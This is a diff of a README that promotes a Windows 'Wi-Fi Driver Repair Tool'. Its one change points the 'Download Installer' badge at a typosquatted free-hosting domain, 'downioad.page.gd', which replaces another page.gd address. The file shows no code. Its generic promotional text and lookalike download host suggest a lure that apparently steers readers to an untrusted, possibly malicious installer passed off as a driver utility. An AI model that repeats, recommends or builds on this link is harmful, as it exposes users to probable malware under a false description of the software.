@@ -2,7 +2,7 @@
 
 The Wi-Fi Driver Repair Tool is a powerful utility designed to help users troubleshoot and resolve wireless connectivity issues on their Windows computers. By scanning for corrupted or outdated drivers, it ensures your Wi-Fi adapter functions optimally, providing a seamless internet experience. Released in 2026, this tool incorporates the latest technology for effective driver management.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## Key Features
 
